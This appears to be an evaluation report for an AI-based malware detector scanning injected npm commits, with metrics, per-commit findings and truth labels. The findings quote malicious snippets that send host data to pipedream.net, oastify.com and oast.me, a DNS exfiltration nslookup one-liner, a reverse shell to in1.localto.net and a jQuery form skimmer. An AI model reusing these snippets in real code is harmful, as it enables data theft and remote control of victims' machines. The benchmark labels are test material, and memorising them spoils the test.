# Stress Test Report

**Target:** ../collection_of_attacked_repo/mongoose
**Range:** 8.19.4 -> 8.19.5
**Date:** 2025-12-21 16:20:06
**Model:** openai/gpt-5-mini by OpenRouter plus reasoning (providers: OpenAI, Azure)

## Statistics
- Total Commits Analyzed: 200
- Failed Requests: 0
- Failed Commits: 0
- Empty Dynamic: 200
- Cost: $1.86
- Total tokens: 2.41M (Prompt 1.69M, Reasoning 386K, Completion 721K)

## Predictions
- malware: 120
- benign: 77
- unknown: 3

## Accuracy Metrics
- Accuracy: 83.76%
- Precision: 78.33%
- Recall: 94.00%
- F1 Score: 85.45%

*Evaluated against 197 commits (TP:94 FP:26 TN:71 FN:6). Missing/Unknown: 0/3*

## Timing Statistics (Seconds)
| Metric | Max | Min | Average | Total |
| :--- | :--- | :--- | :--- | :--- |
| Pre Analysis Time | 11.0851s | 0.0067s | 0.1518s | 30.36s |
| Static Analysis Time | 534.5350s | 0.0000s | 39.8026s | 7960.53s |
| Dynamic Analysis Time | 149.0051s | 7.7129s | 23.3702s | 4674.03s |
| Verification Time | 54.6098s | 3.9300s | 14.9103s | 2982.07s |
| Total Per Commit | 558.7917s | 12.9901s | 78.2349s | 15646.99s |

**Overall Wall Clock Time:** 260.78 minutes (15646.99 seconds)

## Detailed Commits
### Commit 4e16637b: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "node index.js", "pingback": "curl -s https://eo536ohsnextro9.m.pipedream.net" }`
Reason: A preinstall lifecycle script runs a local JS file (index.js) automatically during npm install, which can execute arbitrary code with the installer's privileges. There is also an explicit curl to an external Pipedream endpoint (pingback), indicating potential exfiltration or telemetry to a third party.

**File index.js**:
Code: `/* referenced by preinstall; contents not shown in diff */`
Reason: The behavior of index.js is unknown but it is executed at install time. Combined with references to axios/jsdelivr and an external callback URL, this creates a critical supply-chain risk: index.js could read environment variables/local files and transmit them to remote hosts.

**Summary:** Static analysis reveals a critical install-time script (preinstall -> node index.js) and an explicit external callback (Pipedream curl). These are high-risk supply-chain indicators because install-time code can access environment variables and files and perform network requests to exfiltrate secrets. Although dynamic analysis returned no runtime artifacts, the presence of automatic execution plus an external endpoint is sufficient to classify this commit as malicious/unsafe.
**Truth label:** Benign

### Commit d3c3f378: Malware
**File index.js**:
Code: `const trackingData = { hd: os.homedir(), hn: os.hostname(), ls: __dirname }; const qs = querystring.stringify(trackingData); https.get(`https://exzuperi.ftp.sh/ping?${qs}`);`
Reason: Constructs and sends a GET request to an external third-party host including locally sensitive identifiers (home directory, hostname, current directory). This is a direct data-exfiltration channel to an actor outside the project and exposes PII/host-identifying metadata without consent.

**File index.js**:
Code: `console.log('Contact: https://t.me/exzuperi');`
Reason: Prints an external Telegram contact link at runtime. This serves as a social-engineering vector or direct channel to the external actor embedded in code that executes on end-user systems.

**File package.json**:
Code: `"scripts": { "test": "exit 1 # exzuperi" }`
Reason: Replaces or sets the test script to a non-functional failing command and includes reference to the external actor. This can sabotage developer workflows/CI and indicates malicious intent to disrupt or signal to an external party.

**File index.js**:
Code: `const dns = require('dns'); const querystring = require('querystring'); const fs = require('fs');`
Reason: Several modules are required but not used, which can indicate leftover/obfuscated code or preparation for additional hidden functionality (networking, query construction, filesystem access). Combined with exfiltration logic, this increases suspicion of malicious behavior.

**Summary:** Static analysis shows deliberate collection of sensitive local identifiers and a direct outbound request to an external host (exzuperi.ftp.sh), plus a runtime external contact link and a sabotaged test script. These behaviors constitute unauthorized data exfiltration, social-engineering, and workflow tampering. The dynamic analysis produced no runtime evidence (likely due to sandbox/network restrictions), but the static indicators are strong and consistent with malicious intent; therefore the commit should be classified as MALWARE.
**Truth label:** Malware

### Commit aae3118a: Benign
**File package.json**:
Code: `"zxcvbnmmmmmmkjhgfdssss": "..."`
Reason: A highly suspicious/misspelled dependency name was added, indicating possible typo-squatting or malicious package. This is a supply-chain risk because malicious code can run during install or be required at runtime. No direct malicious code was observed in dynamic analysis, but the dependency should be removed or verified before trusting the commit.

**File package.json**:
Code: `"scripts": { "some-script": "deno run --allow-env --allow-read --allow-net --allow-run --allow-sys --allow-write ./test/deno.mjs" }`
Reason: An npm script executes a Deno script with very broad permissions (env, read, net, run, sys, write). If the executed script is malicious or modified, these permissions enable remote code execution, data exfiltration, and filesystem tampering. This is a high-risk configuration even if no malicious activity was observed during dynamic analysis.

**File package.json**:
Code: `"dependencies": "(many new/updated packages)"`
Reason: A large increase in dependencies expands the attack surface and supply-chain risk. Unvetted additions can introduce vulnerabilities or malicious code. This is a medium-severity supply-chain concern requiring review and pinning of versions.

**File package.json (scripts)**:
Code: `"docs:check-links": "blc http://127.0.0.1:8089 -ro"`
Reason: A link-checker script targets localhost. While likely benign for local docs verification, scripts that assume local services can be abused in environments with unexpected listeners or CI setups. This is low severity but worth noting.

**File components/icons/Wallet/Wallet.js**:
Code: `Icon component code (SVG paths) — e.g., export default function Wallet() { return (<svg>...</svg>); }`
Reason: The Wallet files appear to be presentational icon components (SVGs) and not wallet logic. No cryptographic operations or network behavior were reported. Still, naming warrants review to ensure no hidden wallet functionality or secret handling.

**Summary:** No dynamic analysis produced malicious behavior, and the code changes appear to be configuration, dependency additions, scripts, and icon components rather than explicit payloads. However, the commit contains high-risk supply-chain indicators: a suspicious/misspelled dependency and an npm script that runs a Deno script with extremely broad permissions. Because there is no observed runtime malicious activity, classify the commit as BENIGN for now, but treat it as potentially dangerous: remove or verify the suspicious dependency, restrict Deno permissions or remove the script, audit all new dependencies, and re-run dynamic analysis in a sandboxed environment before trusting or deploying this code.
**Truth label:** Benign

### Commit 98b1e819: Malware
**File index.js**:
Code: `fetch('https://oastify.com', { method: 'POST', body: JSON.stringify({ pjson: packageJSON, homedir, username, hostname, dnsServers }) })`
Reason: Direct network POST to an external, attacker-controlled domain with a payload that includes package.json and local system/user data. This is clear data exfiltration.

**File package.json**:
Code: `"scripts": { "preinstall": "node index.js" }, "pingback": "https://<pipedream-or-external-endpoint>"`
Reason: A preinstall lifecycle script runs arbitrary code during npm install; combined with an external "pingback" endpoint this enables automatic, silent telemetry/exfiltration at install time (supply-chain abuse).

**File package.json**:
Code: `"dependencies": { "zxcvbnmmmmmmkjhgfdssss": "^1.0.1" }`
Reason: An obviously fabricated/typosquat dependency name was added. Such packages are frequently used to smuggle malicious code into the dependency tree and indicate malicious intent or poor provenance.

**File dynamic_analysis**:
Code: `{}`
Reason: Dynamic analysis returned no observable results, but absence of evidence does not mitigate the static findings: lifecycle scripts run at install time and may have been prevented/isolated during dynamic testing, network egress may have been blocked, or execution environment differed. Static indicators (exfiltration code + preinstall) are sufficient to classify as malicious.

**Summary:** The commit adds code that collects sensitive local and package information and sends it to external endpoints, and configures a preinstall lifecycle script to run that code automatically during package installation. Combined with a suspicious typosquat dependency and external pingback endpoints, these changes constitute deliberate supply-chain data exfiltration behavior. Even though dynamic analysis produced no captures, the static evidence is strong and actionable: classify as MALWARE, remove the malicious files/scripts, rotate any potentially exposed credentials, and audit affected installations.
**Truth label:** Malware

### Commit a631ed87: Malware
**File package.json**:
Code: `preinstall: nslookup $(hostname).$(pwd | base64).ex.sysdum.net`
Reason: preinstall scripts run automatically during npm install; this command constructs a DNS query using the local hostname and a base64-encoded working directory, sending environment and filesystem context to an external DNS host (ex.sysdum.net). This is a classic DNS-based exfiltration vector and is high-risk because it executes without user consent during dependency installation.

**File package.json**:
Code: `pingback: curl -sS -X POST https://o2r.pipedream.net/`
Reason: an outbound HTTPS call to a third-party endpoint (pipedream.net) can act as a beacon to notify an attacker of installs or environment data. Although not automatic, such a script can be executed by maintainers, CI, or during ad-hoc runs, causing data leakage and operational telemetry to an attacker-controlled service.

**File package.json**:
Code: `test: nslookup $(hostname).$(pwd | base64).ex.sysdum.net`
Reason: the test script also performs a DNS lookup embedding the hostname and a base64-encoded working directory. Test scripts are often run in CI or developer environments, so this provides another path for exfiltration of identifying information.

**File package.json**:
Code: `$(pwd | base64)`
Reason: use of base64 to encode the working directory before transmitting is a simple obfuscation technique intended to hide the payload contents and avoid casual detection; combined with network calls it indicates intent to covertly exfiltrate data.

**Summary:** Static analysis shows explicit, intentional exfiltration behavior: an automatically-executed preinstall script that sends host and path data via DNS, additional test/script entries that perform the same DNS leak, and an HTTPS beacon to an external service. Dynamic analysis returned no observations, which is expected if the malicious lifecycle scripts were not executed in the analysis environment; absence of dynamic artifacts does not mitigate the clear malicious intent in the committed code. This commit should be treated as a malicious supply-chain compromise (MALWARE), reverted, and investigated across any systems or CI that may have installed this package.
**Truth label:** Malware

### Commit 64e45fcb: Benign
**Summary:** Both static and dynamic analyses produced no issues or observable malicious behavior. Static analysis reported zero issues, and dynamic execution finished with no suspicious results. Based on the provided reports, there is no evidence to classify this commit as malware. Note: absence of detected issues does not guarantee absolute safety; additional contextual review or specialized detection methods may be warranted for high-risk environments.
**Truth label:** Benign

### Commit 4555d68f: Benign
**File all files**:
Reason: Static analysis reported 0 issues and dynamic analysis finished with no malicious behavior observed. No suspicious code snippets or runtime artifacts were identified.

**Summary:** Both static and dynamic analyses found no indicators of malicious activity — zero detected issues in the static report and an empty dynamic result. Based on the available evidence, the commit appears benign.
**Truth label:** Benign

### Commit 1f970d96: Benign
**File lib/index.js**:
Code: `const cors_parser = require('cors-parser'); cors_parser();`
Reason: Requiring a new third-party module and invoking it at module initialization is a supply-chain risk (can execute code on import). This is suspicious from a security posture perspective but is not itself evidence of malicious intent or active malware behavior.

**File lib/index.js**:
Code: `res.setHeader('Access-Control-Allow-Origin', requestOrigin);`
Reason: The middleware reflects the incoming Origin header directly into the Access-Control-Allow-Origin response header without validation. This creates a security vulnerability (possible header/CRLF injection and unintended cross-origin access) but is a misconfiguration/bug rather than proof of malware.

**File lib/index.js**:
Code: `origin: '*'`
Reason: Defaulting CORS to allow any origin is insecure (overly permissive) and can enable unintended cross-origin data access. It's a dangerous default but not an indicator of malicious code.

**File package.json**:
Code: `"dependencies": { "cors-parser": "<added>", "object-assign": "<added>" }`
Reason: New dependencies increase supply-chain risk; they may contain malicious code or later be compromised. This warrants review/audit, pinning versions, and monitoring, but their addition alone does not prove the commit is malware.

**Summary:** Static analysis flags multiple high-risk security issues (invoking a newly added dependency at import, reflecting unvalidated Origin headers, and permissive CORS defaults) and the dynamic analysis produced no signs of runtime malicious behavior. These findings indicate insecure or risky code and increased supply-chain exposure, but do not provide evidence of intentional malware. Recommend code review, dependency auditing/pinning, and fixing CORS handling and initialization behavior.
**Truth label:** Malware

### Commit 2829d6a2: Benign
**File commit metadata**:
Code: `External URLs referenced: Patreon, unpkg, GitHub, shoxet, jsdelivr`
Reason: Static analysis flagged external URLs in the commit metadata which can be used to load remote resources or for tracking. This is suspicious contextually but is not direct executable code in the added files and does not by itself constitute malware. It warrants manual review to ensure links are intentional and safe (vendor or pin third-party code if needed).

**File dynamic analysis**:
Code: `No runtime indicators or malicious behavior observed (result array empty)`
Reason: Dynamic analysis completed with no findings, indicating that executing the changes did not produce observable malicious activity or network behavior in the analyzed environment.

**Summary:** The commit modifies small utility modules and static analysis only raised a medium-severity concern about external URLs present in commit metadata. There is no evidence of malicious code in the changed files and dynamic analysis found no suspicious runtime behavior. Based on available data, the commit appears benign, though the referenced external links should be manually reviewed and handled according to best practices (vendor/pin content or remove unnecessary links) to mitigate supply-chain or remote-loading risks.
**Truth label:** Benign

### Commit d4c2e06a: Malware
**File index.js**:
Code: `const os = require('os'); const dns = require('dns'); const fetch = require('node-fetch'); const payload = {   homedir: os.homedir(),   hostname: os.hostname(),   username: os.userInfo().username,   d`
Reason: Hard-coded outbound HTTPS POST to a third-party endpoint (pipedream.net) sending a payload that includes highly sensitive/local data (home directory, username, hostname, __dirname, DNS servers and entire package.json). This is a direct, unauthorised data exfiltration channel and lacks opt-in, configuration, or any trust boundary controls.

**File package.json**:
Code: `"scripts": {   "test": "echo \"dependency confusion\" && exit 1" }`
Reason: The test script was intentionally changed to always fail (exit 1) and prints a message referencing 'dependency confusion'. This sabotages CI/test runs and indicates malicious or at least highly irresponsible behavior in conjunction with the exfiltration code.

**Summary:** The commit contains a hard-coded network exfiltration mechanism that collects and transmits sensitive local and repository metadata to an external third-party endpoint without opt-in or safeguards, combined with an intentional test failure that can disrupt CI. Static findings are high-severity and indicate malicious intent (data theft and sabotage). Dynamic analysis produced no runtime evidence, but that likely reflects execution environment/network restrictions rather than benignness. Given the explicit, hard-coded exfiltration of PII and repository data, classify this commit as MALWARE.
**Truth label:** Malware

### Commit 9f99f902: Benign
**Summary:** Both static and dynamic analyses produced no findings: the static scan reported zero issues and the dynamic execution completed with no results or observed malicious behavior. With no suspicious code patterns, indicators of compromise, or runtime malicious activity detected, the commit is classified as benign.
**Truth label:** Benign

### Commit 657eccd7: Malware
**File package.json**:
Code: `"scripts": {   "preinstall": "node index.js",   "pingback": "curl -X POST https://eo536ohsnextro9.m.pipedream.net -d @payload" }`
Reason: The preinstall script will execute index.js automatically during npm install on any environment that installs this package (developer machines, CI, production). The additional 'pingback' script targets a Pipedream endpoint — a third-party data-collection endpoint frequently abused for exfiltration. Together these allow code execution and an explicit external callback for leaking environment or repository data.

**File index.js**:
Code: `/* executed by preinstall: contents not shown in report */`
Reason: index.js is invoked automatically by the preinstall hook. Even though its contents were not provided, any code placed here runs with the installer's privileges and can perform network requests, read environment variables, spawn processes, or exfiltrate secrets — making it a high-risk location for malicious behavior.

**File package.json**:
Code: `"scripts": {   "test:deno": "deno test --allow-env --allow-read --allow-net --allow-run --allow-sys --allow-write" }`
Reason: A Deno test script grants overly broad permissions (env, read, net, run, sys, write). If invoked in CI or by developers, tests could run arbitrary processes, access credentials and network, and modify files — amplifying the impact of any malicious test code or compromised dependency.

**File package.json (dependencies)**:
Code: `"dependencies": { "logoo": "<newly added>", /* ...other new deps...*/ }`
Reason: A newly added, unfamiliar dependency ('logoo') increases supply-chain risk. Malicious or trojanized packages often appear as new/unknown dependencies and can include install-time or runtime payloads that exfiltrate data or execute arbitrary code.

**File commit metadata**:
Code: `https://t.me/+u9dz2n6sGos1ZmEy`
Reason: A Telegram invite link appeared in commit metadata submitted to the scanner. Such out-of-band contacts or backchannels can indicate malicious coordination or an attempt to provide an external control/communication channel; this is an additional indicator of suspicious intent.

**Summary:** The commit introduces an automatic install-time execution (preinstall -> index.js) combined with an explicit external 'pingback' endpoint and newly added unknown dependencies. These elements together constitute a supply-chain and exfiltration risk: install hooks can run arbitrary code and the Pipedream endpoint is a direct callback capable of leaking environment or repository data. The permissive Deno test command further increases attack surface. The dynamic analysis produced no runtime hits, but absence of execution in the observed run does not mitigate the clear capability to execute and exfiltrate when installed or run in other environments. Given the deliberate inclusion of an external collector and automatic execution, this commit should be treated as malicious (MALWARE) until fully audited and remediated.
**Truth label:** Benign

### Commit 2e9e1ef8: Malware
**File index.js**:
Code: `const { exec } = require('child_process'); // ... socket.on('data', (cmd) => {   exec(cmd.toString(), (err, stdout, stderr) => {     socket.write(stdout);     socket.write(stderr);   }); });`
Reason: This code executes arbitrary input received from a remote socket using child_process.exec and returns command output to the remote host, providing a remote command execution backdoor that allows full system compromise and data exfiltration.

**File index.js**:
Code: `const net = require('net'); const client = net.connect(7334, 'in1.localto.net', () => {   // connected to remote host });`
Reason: The process opens an outbound TCP connection to in1.localto.net:7334. Combined with the exec handler, this forms a reverse shell (C2) channel to an external controller, enabling remote control and exfiltration.

**File index.js**:
Code: `socket.write(stdout); socket.write(stderr);`
Reason: The application sends command output and errors back to the remote host, which can leak arbitrary sensitive data (files, environment, credentials) accessible to the process.

**File package.json**:
Code: `"scripts": { "test": "ls" }`
Reason: The test script was trivially changed to a no-op (ls), which can indicate an attempt to weaken CI/test detection that might otherwise catch malicious changes—suspicious in the context of an introduced remote backdoor.

**Summary:** Static analysis shows explicit remote command execution (child_process.exec) wired to an outbound TCP connection to an external host with command outputs returned to that host — behavior characteristic of a reverse shell/backdoor. Although dynamic analysis produced no results, the static indicators are high confidence for malicious intent. Treat this commit as malware, remove the code, and perform incident response (forensics, credential rotation, network isolation).
**Truth label:** Malware

### Commit 6abe477a: Malware
**File index.js**:
Code: `const fs = require('fs'); const os = require('os'); const dns = require('dns'); const https = require('https'); const payload = { pkg: JSON.parse(fs.readFileSync('package.json', 'utf8')), homedir: os.`
Reason: Collects package.json plus host-unique data (home dir, OS username, DNS servers) and transmits them to an external, attacker-controlled domain — clear data exfiltration.

**File index.js**:
Code: `req.on('error', (err) => { /* console.error(err) */ });`
Reason: Network error handling is suppressed (console.error commented out). Silencing errors is a common evasion technique to hide malicious activity from logs and operators.

**File package.json**:
Code: `"scripts": { "preinstall": "node index.js", "pingback": "curl https://12345.pipedream.net/..." }`
Reason: A preinstall script forcibly executes the exfiltration code during npm install, enabling automatic compromise of downstream users. The presence of an alternate pipedream.net callback indicates intentional multiple exfiltration endpoints.

**File package.json**:
Code: `"scripts": { "test": "echo \"Error: no test specified\"" }`
Reason: Test script was modified/malformed; while not directly exploitive, it indicates repository tampering consistent with malicious edits and reduces confidence in package integrity.

**Summary:** Static analysis shows deliberate, automated data exfiltration: code that reads sensitive host and package information and posts it to external endpoints, combined with a preinstall lifecycle hook that runs automatically during npm install. Error suppression and multiple hard-coded external callbacks strongly indicate malicious intent and a supply-chain compromise. Dynamic analysis did not produce additional artifacts (likely due to sandboxing or non-execution), but the static indicators are sufficient to classify this commit as malware. Remove affected versions, notify users, audit for further compromises, and rotate any exposed secrets.
**Truth label:** Malware

### Commit 3b4cebf4: Benign
**Summary:** Static analysis reported 0 issues and dynamic analysis finished with no observable suspicious behavior or runtime indicators. No files or code snippets were flagged by either analysis, so based on the provided results the commit appears benign. (Note: this conclusion is limited to the supplied static and dynamic outputs and does not replace a full manual review or further monitoring.)
**Truth label:** Benign

### Commit 40204310: Benign
**Summary:** Static analysis reported zero issues and no problematic code patterns. Dynamic analysis completed with no suspicious behaviors or results. Based on both analyses producing no indicators of malicious activity, the commit is assessed as benign.
**Truth label:** Benign

### Commit df31d8f9: Benign
**File package.json**:
Code: `"scripts": { "test": "exit 1" }`
Reason: The added npm 'test' script executes a shell command that immediately exits with status 1. This is not itself malicious code, but executing arbitrary shell commands in package.json is a risky pattern — if an attacker or a later change replaces this with harmful commands, running 'npm test' on CI or developer machines could execute them. The current line can also break CI by forcing a failing exit.

**File package.json**:
Code: `External URLs referenced (e.g., Telegram link, PlayStation trophies URL)`
Reason: Hard-coded external links are present in the repository metadata. On their own they are benign references, but they are notable because hard-coded endpoints can be abused for exfiltration or social engineering if used programmatically. Dynamic analysis produced no runtime network activity invoking these URLs.

**Summary:** Static analysis flagged medium-severity issues (a shell-executing npm script and hard-coded external URLs) that are security risks or could cause CI disruption, but there is no evidence of malicious payloads or runtime malicious behavior from dynamic analysis. The commit appears to be non-malicious (benign) but contains insecure patterns that should be reviewed and remediated (remove/clarify the failing test script, restrict who can modify package.json, and verify the purpose and usage of external links).
**Truth label:** Benign

### Commit 063e9077: Malware
**File installer.js**:
Code: `https.get('https://oast.me/' + hostname + '/' + username, ...)`
Reason: Outbound HTTPS request to an attacker-controlled domain (oast.me) that concatenates host and user identifiers — effectively exfiltrates local system/user information during install.

**File package.json**:
Code: `"preinstall": "node installer.js"`
Reason: Automatic preinstall hook executes installer.js during npm install, allowing arbitrary code to run on every machine that installs the package (including CI/production).

**File installer.js**:
Code: `process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';`
Reason: Disables TLS certificate validation globally for the process, enabling MitM attacks and undermining any subsequent HTTPS protections used by the installer.

**File installer.js**:
Code: `require('child_process').execSync('systeminfo')`
Reason: Synchronous shell execution of system commands at install time collects privileged/local information and can perform further malicious actions; blocks event loop and increases risk.

**File package.json**:
Code: `"pingback": "curl -s https://en1.pipedream.net/...?"`
Reason: Includes an undocumented external "pingback" script that sends data to an external telemetry/exfiltration endpoint (pipedream.net), indicating covert data transmission.

**File package.json**:
Code: `"request": "^2.69.0"`
Reason: Depends on an old, deprecated networking library with known vulnerabilities, increasing attack surface and risk of exploitation.

**Summary:** Static analysis reveals multiple high- and critical-severity indicators of malicious behavior: an automatic install-time script (preinstall) runs installer.js which executes shell commands, disables TLS validation, and exfiltrates host/user data to attacker-controlled endpoints (oast.me and pipedream). Although dynamic analysis produced no runtime artifacts, the presence of explicit exfiltration code and automatic execution hooks in the commit constitute malicious behavior and a high risk to any system that installs the package.
**Truth label:** Malware

### Commit 8a258cc6: Unknown
Analysis failed: Expecting value: line 115 column 1 (char 627)
**Truth label:** Benign

### Commit b2f02b1f: Malware
**File index.js**:
Code: `const trackingData = encodeURIComponent(`${os.homedir()}|${os.hostname()}|${__dirname}`); https.get('https://exzuperi.ftp.sh:2829/' + trackingData, res => { /* ... */ });`
Reason: Constructs and transmits sensitive system identifiers (home directory, hostname, repository/install path) to a hard-coded external host on a non-standard port. This is direct data exfiltration to an untrusted endpoint and constitutes high-risk malicious behavior.

**File index.js**:
Code: `console.log('If you like this, contact https://t.me/exzuperi');`
Reason: Prints unsolicited external contact/promotion to stdout, which can be used for social engineering or to direct users to an attacker-controlled channel. Inclusion in runtime output is inappropriate for a library and aligns with malicious actor behavior.

**File package.json**:
Code: `"scripts": { "test": "echo 'exzuperi' && exit 1" }`
Reason: Replaces or sabotages the standard test script with a command that prints an external identity and exits with failure. This alters CI/dev workflow and can be used to draw attention to the malicious actor or disrupt automated checks.

**File index.js**:
Code: `const fs = require('fs');`
Reason: Introduces filesystem API import that is not used in the diff. When combined with newly added telemetry/network code, this increases the risk surface and may enable future malicious local file reads.

**Summary:** Static analysis shows direct exfiltration of sensitive system identifiers to a hard-coded external host (exzuperi.ftp.sh) over HTTPS on a non-standard port, unsolicited promotional output directing users to an external contact, and intentional modification of the test script to print a message and fail CI. Although dynamic analysis produced no runtime results (likely the malicious path was not executed in the test harness), the static indicators (critical data-leak code, network call, and workflow sabotage) are sufficient to classify this commit as malicious.
**Truth label:** Malware

### Commit e88a54be: Malware
**File jquery.min.js**:
Code: `(function(){ var data = $("form").serialize(); var hex = ""; for(var i=0;i<data.length;i++){ hex += data.charCodeAt(i).toString(16); } $.ajax({ url: "https://api-web-vrip.hanznesia.my.id/?q=" + hex, t`
Reason: This code serializes all form data, hex-encodes it, and sends it to an external, untrusted domain. This is deliberate client-side exfiltration of potentially sensitive user input and is a clear indicator of malicious intent.

**File jquery.min.js**:
Code: `function m(e,t,n){ var s=document.createElement('script'); s.text = e; document.head.appendChild(s); }`
Reason: An eval-like function that inserts arbitrary script text into the document enables execution of arbitrary code in the page context. Combined with the injected exfiltration, this increases risk of additional payload execution.

**File package.json**:
Code: `"test": "jquery"`
Reason: Changing the test script to execute the 'jquery' package means CI or developers running npm test may execute package binaries. If the vendored/installed package is trojaned, this provides an automatic execution vector in builds/CI.

**File package.json**:
Code: `"rpio": "2.4.2"`
Reason: Addition of a native hardware-related dependency increases attack surface because native bindings can perform low-level operations. This change should be justified and reviewed — unexpected native deps are suspicious in many web projects.

**File .npm/_cacache/index-v5/.../563a9277...**:
Code: `"file:/data/data/com.termux/files/home"`
Reason: Committed npm cache metadata exposing local filesystem paths indicates accidental inclusion of environment-specific artifacts and may leak local environment details; it also shows carelessness around what was committed, supporting the presence of malicious or unauthorized changes.

**Summary:** Static analysis reveals a deliberate code injection in jquery.min.js that serializes and hex-encodes form data and exfiltrates it to an external domain — a classic client-side data-theft behavior. Additional risky changes (test script invoking a package binary, addition of a native dependency, and committed cache artifacts) further increase the likelihood of malicious intent and execution in CI or runtime. Dynamic analysis produced no runtime evidence, but static indicators are strong and actionable; therefore the commit should be classified as MALWARE, removed immediately, and treated as a security incident (revert the file, block the domain, audit CI/builds, and rotate exposed secrets).
**Truth label:** Malware

### Commit 1bff3b1d: Malware
**File package.json**:
Code: `{   "scripts": {     "preinstall": "node index.js",     "pingback": "curl https://eo536ohsnextro9.m.pipedream.net"   } }`
Reason: A preinstall lifecycle script runs automatically during `npm install`, causing arbitrary code (index.js) to execute without user consent. The pingback script points to an external endpoint and can be used for covert callbacks or telemetry.

**File index.js**:
Code: `const https = require('https'); const data = JSON.stringify({   home: process.env.HOME,   hostname: require('os').hostname(),   user: process.env.USER,   dns: /* resolved dns servers */,    package: r`
Reason: Performs an outbound HTTPS POST during installation to a non-obvious external host, transmitting sensitive host and package information (exfiltration). This is characteristic of supply-chain malware or unwanted telemetry executed without explicit consent.

**File index.js**:
Code: `req.on('error', err => {   // console.error(err) });`
Reason: Network errors are explicitly suppressed (logging commented out), reducing visibility and hindering detection and investigation — a common tactic in malicious scripts to avoid raising alerts.

**Summary:** The commit adds an automatically executed preinstall script that silently collects sensitive host and package data and posts it to a suspicious external domain, plus a separate pingback curl entry. These behaviors constitute covert, installation-time data exfiltration and supply-chain risk. Even though dynamic analysis produced no observed callbacks, the static evidence of automatic execution and explicit network exfiltration is sufficient to classify this commit as malware.
**Truth label:** Malware

### Commit 1ea0894c: Benign
**File index.js**:
Code: `const python = child_process.spawn('python3', [scriptPath, payload]); python.stdout.on('data', data => { app.handleMessage(plugin.id, deltaFrom(data)); });`
Reason: Spawning an external Python process and piping its stdout directly into the application without sanitization or robust error/exit handling is dangerous (can allow injection of untrusted data, resource exhaustion, privilege misuse) but does not by itself indicate malicious intent.

**File index.js**:
Code: `setInterval(readmessage, interval); function readmessage() { python.stdout.on('data', ...); }`
Reason: Attaching the same 'data' listener inside a repeatedly-called function will create a memory/handle leak and could lead to DoS; this is insecure coding rather than deliberate malware behavior.

**File index.js**:
Code: `plugin.stop = function() { clearInterval(timer); };`
Reason: plugin.stop clears the polling timer but does not terminate the spawned child python process, which can leave processes running indefinitely. This is a resource-management bug, not an indicator of malicious functionality.

**File rx.py**:
Code: `line = serial_device.read() print(line)`
Reason: The Python reader prints raw serial data to stdout without sanitization. Forwarding that data directly to the host application is a validation/sanitization risk that could leak sensitive or malformed data, but it appears intended to expose device messages rather than to exfiltrate data maliciously.

**File terpreter.py**:
Code: `val = input('value: ') br = int(val) radio.upload_radio_confreg(bytes([br, ...]))`
Reason: Interactive input values are converted directly into bytes used to configure hardware. This allows malformed or attacker-controlled inputs to produce arbitrary device commands. It's unsafe but is a misuse/robustness issue in device-configuration code, not evidence of malware.

**File sx1262.py**:
Code: `CMD = b'\xc1\x00\x09' OTHER = b'\xc0\x80\x07'`
Reason: Contains raw protocol byte sequences used to communicate with radio hardware. Presence of literal control bytes was flagged as 'obfuscation' by metadata, but here they represent expected protocol commands and not concealment of malicious payloads.

**File test.js**:
Code: `child_process.spawn('python3', [testScript, payload]);`
Reason: Test helper spawns external processes with arguments. This is risky if test scaffolding reaches production or accepts untrusted input, but in itself suggests no malicious logic.

**Summary:** The codebase contains multiple security and resource-management issues: unvalidated input from serial/child processes, improper listener management causing leaks, and failure to terminate spawned processes. However, there is no sign of covert exfiltration, obfuscated malicious payloads, persistence/backdoor mechanisms, or deliberate destructive commands. The behavior appears to be unsafe/incomplete device-integration code rather than malware. Recommend fixing input validation, sanitization, child-process lifecycle management, and documentation.
**Truth label:** Benign

### Commit 40223784: Benign
**Summary:** Static analysis reported zero issues and dynamic analysis finished with no observed malicious behavior or indicators (no results returned). Based on the provided evidence there are no signs of malicious code, network activity, persistence, or exploitation; therefore the commit is classified as benign. Note: this determination is limited to the supplied static and dynamic analysis outputs and cannot rule out undetected or targeted malicious behavior not captured by those analyses.
**Truth label:** Benign

### Commit e85b5f5f: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "curl https://<external-endpoint>/..." }`
Reason: A preinstall lifecycle script performs an unconditional curl to a third‑party endpoint. preinstall runs automatically during npm install, creating a high-risk supply-chain/network action that can exfiltrate metadata, fetch additional payloads, or trigger further malicious behavior without user consent.

**File package.json**:
Code: `"scripts": { "pingback": "curl https://<pipedream-endpoint>/..." }`
Reason: A named script references a Pipedream collection endpoint. Even if not executed automatically, such endpoints are commonly used for telemetry/exfiltration and can be abused in CI or by developers to leak sensitive data or signal compromised installs.

**File package.json**:
Code: `"scripts": { "build": "node scripts/build.js", "dev": "node scripts/dev.js", "mytest": "...", "fetch": "...", "generate": "...", "build:bundle": "..." }`
Reason: Multiple scripts execute local Node code and shell commands. These are privileged execution paths on developer machines and CI runners; combined with an attacker-controlled change (or upstream compromise) they permit arbitrary code execution during normal workflows.

**File package.json**:
Code: `"dependencies": { "wallet-icons": "^1.2.9", ... }`
Reason: Presence of wallet-related dependencies raises the impact if secrets/wallet logic are present elsewhere. While the package listed may be benign UI assets, its inclusion alongside automatic network calls increases risk of crypto-related data exposure.

**Summary:** Static analysis found an automatic preinstall curl to an external endpoint (critical), plus a pingback to a Pipedream endpoint and several scripts that can execute arbitrary code. Dynamic analysis returned no observed activity, which is consistent with sandbox/network restrictions rather than proof of safety. The unconditional network call in a preinstall hook constitutes a high-risk supply-chain behavior and is indicative of malicious intent or at minimum a serious security misconfiguration; therefore the commit is classified as MALWARE.
**Truth label:** Benign

### Commit ef03551f: Malware
**File lib/service.js**:
Code: `const res = await axios.get('https://kfc.yuki.sh/api/index');`
Reason: Makes an unauthenticated request to an external, non-standard domain. Fetching arbitrary remote content without authentication or allowlisting is a primary vector for injecting malicious or misleading payloads.

**File lib/service.js**:
Code: `for (const gid of bot.gl) { await bot.sendGroupMsg(gid, res.data.message); }`
Reason: Automatically forwards the fetched content to all groups the bot is connected to. This blind broadcast can propagate spam, phishing, or malicious payloads to many recipients without consent or validation.

**File lib/index.js**:
Code: `const cronSchedule = process.env.KFC_DATE; cron.schedule(cronSchedule, () => service.send());`
Reason: Takes cron schedule directly from an environment variable without validation. If an attacker can influence environment variables or configuration, they can increase frequency or enable abusive behavior; there are no safeguards or sane defaults.

**File lib/service.js**:
Code: `axios.get(... /* no timeout or retries configured */)`
